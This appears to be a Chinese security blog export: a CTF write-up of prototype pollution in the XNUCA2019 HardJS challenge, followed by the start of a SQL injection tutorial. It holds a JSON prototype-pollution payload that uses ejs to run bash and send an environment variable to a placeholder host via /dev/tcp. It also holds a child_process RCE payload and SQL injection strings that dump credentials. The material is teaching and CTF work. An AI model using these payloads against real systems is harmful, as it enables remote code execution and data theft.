<p>以上就是最基础的JavaScript面向对象编程，并不深入研究更细节的内容，只要牢记以下几点即可：</p>
<ol>
<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
<li>JavaScript使用prototype链实现继承机制</li>
</ol>
<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>前面说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>


<p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p>
<p><img src="https://s2.loli.net/2022/03/15/L1e3BF6JDiXakdT.png"></p>
<p>原因也显而易见：因为前面修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
<p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
<p>js中有个json.prase的方法,json解析的时候,会把<code>__proto__</code>变成一个键名，可以理解为和a同级,而不是一个原型的属性了，变成一个普通的属性。</p>
<p><img src="https://s2.loli.net/2022/03/15/TVdf34HI1QRkGYo.png"></p>
<p>到此，其实只要出现继承且参数可控，就有可能有原型链污染出现。也就是出现函数作为对象解释，或者作为对象解释的某个东西在合并2个参数即可出现污染。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownasdasf.png"></p>
<p>常规Payload</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">e =&gt; &#123; <span class="keyword">for</span> (<span class="keyword">var</span> a <span class="keyword">in</span> &#123;&#125;) &#123; <span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[a]; &#125; <span class="keyword">return</span> <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;uname -a&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其他视具体情况改变。</p>
<p>一般两个函数<code>(merge，和clone)</code>可以形成攻击环境</p>
<p><code>[a.name](http://a.name)`` = a[&#39;name&#39;]</code></p>
<h1 id="XNUCA2019Qualifier-HardJS"><a href="#XNUCA2019Qualifier-HardJS" class="headerlink" title="[XNUCA2019Qualifier]HardJS"></a>[XNUCA2019Qualifier]HardJS</h1><p>这题是可以下载源码的。</p>
<p>查看ejs的源码，看到下面代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">source</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">generateSource</span>();</span><br><span class="line">  prepended += <span class="string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">    prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">_with</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">    prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  appended += <span class="string">&#x27;  return __output.join(&quot;&quot;);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">source</span> = prepended + <span class="variable language_">this</span>.<span class="property">source</span> + appended;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><code>server.js</code>中是服务器的主要逻辑代码，可以看到其使用了<code>ejs</code>作为渲染引擎，并使用了中间件<code>body-parser</code>，通过这一行代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extend</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br></pre></td></tr></table></figure>


<p>说明服务器会接收POST传过来的json数据，而且我也知道这道题目的考察点就是原型链污染（因为就是奔着掌握这个知识点来刷题的），那么我们就可以通过这个接口传入参数到服务端了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/get&quot;</span>,auth,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.<span class="property">session</span>.<span class="property">userid</span> ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">&quot;select count(*) count from `html` where userid= ?&quot;</span></span><br><span class="line">    <span class="comment">// var sql = &quot;select `dom` from  `html` where userid=? &quot;;</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Merge the recorder in the database.&quot;</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `id`,`dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.<span class="property">length</span> ;i++)&#123;</span><br><span class="line">            lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">&quot;delete from `html` where id = ?&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,raws[i].<span class="property">id</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">affectedRows</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.<span class="title function_">push</span>(doms);</span><br><span class="line">            res.<span class="title function_">json</span>(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">json</span>([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Return recorder is less than 5,so return it without merge.&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.<span class="property">length</span> ; i++)&#123;</span><br><span class="line">            ret.<span class="title function_">push</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">        res.<span class="title function_">json</span>(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>分析以上代码知道，当<code>datalist</code>的长度大于5时，会执行这一条语句：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br></pre></td></tr></table></figure>


<p>然后问题就变成了怎么让<code>datalist</code> 的长度大于5，通过<code>server.js</code>定义的<code>/add</code>接口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/add&quot;</span>,auth,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">type</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">content</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> newContent = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> userid = req.<span class="property">session</span>.<span class="property">userid</span>;</span><br><span class="line"></span><br><span class="line">        newContent[req.<span class="property">body</span>.<span class="property">type</span>] = [ req.<span class="property">body</span>.<span class="property">content</span> ]</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newContent:&quot;</span>,newContent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(newContent) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">affectedRows</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            res.<span class="title function_">json</span>(newContent);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">json</span>(&#123;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p>我们只需要构造type和content两个键值，将<code>Content-Type</code>设置为<code>application/json</code>，然后post访问该接口5次以上便可以</p>
<p>污染点找到了，接下来是如何利用原型链污染来获取Flag，这道题目有两种方式：</p>
<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><h3 id="利用ejs进行rce"><a href="#利用ejs进行rce" class="headerlink" title="利用ejs进行rce"></a>利用ejs进行rce</h3><p>因为<code>server.js</code>调用了ejs作为模板渲染引擎，经过调试跟进，可以在<code>ejs.js</code>中发现如下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">compile</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">...</span><br><span class="line">src = <span class="variable language_">this</span>.<span class="property">source</span>;</span><br><span class="line">...</span><br><span class="line">fn = <span class="keyword">new</span> <span class="title function_">ctor</span>(opts.<span class="property">localsName</span> + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br><span class="line"><span class="comment">// Return a callable function which will execute the function</span></span><br></pre></td></tr></table></figure>


<p>这段代码的意思便是，<code>opt.outputFunctionName</code>会被作为字符串拼接到<code>prepended</code>中，然后到<code>src</code>、<code>fn</code>最终作为代码执行。而且<code>opt.outputFunctionName</code>这个成员在函数的上下文中完全没有出现过，也就是<code>undefined</code>那么我们通过给<code>Object.prototype</code>加上这一属性，就可以达到RCE的效果了</p>
<p>payload如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;a=1;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;b</span></span><br><span class="line"><span class="string">ash -c \&quot;echo $FLAG&gt;/dev/tcp/xxxxx/xx\&quot;&#x27;)//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>向<code>/add</code>接口POST 6次，然后再访问一次<code>/get</code>，再访问<code>/</code>或<code>/login</code>触发<code>render()</code>函数即可</p>
<p>FLAG在环境变量中</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>contaminate</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入详解2.0-重构篇</title>
    <url>/SQLInject/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A32.0-%E9%87%8D%E6%9E%84%E7%AF%87/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><blockquote>
<p>之前写过一篇，但是愈发感觉到之前写的薄弱和乱，所以重构！</p>
</blockquote>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownecEnPtXKhJqdw1B.jpg"></p>
<span id="more"></span>


<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><center>正文</center></h1><p>实际上注入类漏洞最<font color="red"> 本质的原因就是</font> ，<code>混淆了代码和数据的边界</code>。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownbP659ZCEGdpOSFm.png"></p>
<ul>
<li>注入的类型总的就只有3种：<ul>
<li>联合注入<ul>
<li>联合注入从类型来划分又有：<ol>
<li>数字型</li>
<li>字符型</li>
</ol>
</li>
<li>联合注入从注入点来划分又有：<ol>
<li>搜索框注入</li>
<li>HTTP头注入<ol>
<li>User-Agent注入</li>
<li>X-Forwarded-For注入</li>
<li>Cookie注入</li>
</ol>
</li>
</ol>
<ul>
<li>报错注入</li>
<li>盲注<ul>
<li>盲注从方式来划分有：<ul>
<li>时间盲注</li>
<li>布尔盲注</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a><center>联合注入</center></h1><p>由<font color="red"> union select</font>得名，是一种最快的查询方式。</p>
<p>从注入类型来划分讲。</p>
<h2 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h2><p>也就是不用闭合，用户的输入直接被解析成了新的SQL语句。</p>
<p>从代码层面来看如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id + <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>从上图可以看到<font color="red"> id是以+直接进行拼接的</font> ，这样我们就可以从直接给id，SQL语句让他直接执行以此产生SQL注入。</p>
<h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>字符型就要进行闭合，并且闭合是非常关键的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>在第8行可以清晰的看到id被单引号包围起来，如果想要响应自己想要执行的SQL语句就执行如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>


<p>因为<font color="red"> 引号的就近匹配</font> ，所以单引号会和左边最近的符号匹配。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;;&quot;;</span></span><br></pre></td></tr></table></figure>


<p><code>&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39;</code> 此部分自成一块</p>
<p><code>#&#39;;&quot;;</code> #之后被注释。</p>
<p>因此你输入的SQL语句<font color="red"> 将被独立代入MySQL数据库解析</font> ，以此达到注入的效果。</p>
<p>之后的按照注入点划分，也要判断数字型和字符型，以此类推。注入语句将放在后面统一讲。</p>
<h2 id="叠堆注入"><a href="#叠堆注入" class="headerlink" title="叠堆注入"></a>叠堆注入</h2><p>笼统的讲，叠堆注入也是联合注入。</p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><center>报错注入</center></h1><p>测试时发现会<font color="red"> 回显报错信息</font> ，就可以试试报错注入。</p>
<ul>
<li>报错注入主要用到3个函数<ul>
<li>floor()</li>
<li>extractvalue()</li>
<li>updatexml()</li>
</ul>
</li>
</ul>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ul>
<li><p>数据库</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line">database()</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>表</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>列名</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(</span><br><span class="line"><span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>dump</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(id,username,password))<span class="keyword">from</span>(geek.H4rDsq1)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>其他几个函数以此类推，<font color="red"> 绕WAF根据数据库版本换成数学函数。</font> </p>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><center>盲注</center></h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><font color="red"> 根据页面的回显不同来判断</font> 。</p>
<p>Payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库名：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆表名：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>)<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line">爆列明：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 1,1),8)=&#x27;</span>username<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆数据：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>




<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>根据回显时间的不同来判断。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if((<span class="number">1</span>)<span class="keyword">like</span>(<span class="number">1</span>),<span class="number">5</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>


<p>Payload</p>
